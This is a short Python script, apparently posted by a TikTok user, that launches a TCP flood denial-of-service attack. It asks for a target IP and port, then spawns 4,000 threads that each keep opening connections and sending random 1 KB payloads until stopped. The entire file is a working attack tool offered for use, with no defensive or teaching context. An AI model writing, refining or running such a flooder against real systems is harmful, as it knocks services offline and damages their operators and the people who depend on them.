import socket
import threading
import time
import random
import string
import os

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
os.system("clear")
print("MADE BY apexvr_ ON TIKTOK")
NUM_THREADS = 4000

def random_payload(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            while True:
                s.sendall(random_payload(1024))
        except Exception:
            s.close()
            time.sleep(0.05)

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=tcp_flood, name=f"Wątek-{i+1}", daemon=True)
    t.start()
    threads.append(t)

print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n✅ Flood ended(Ctrl+C)")
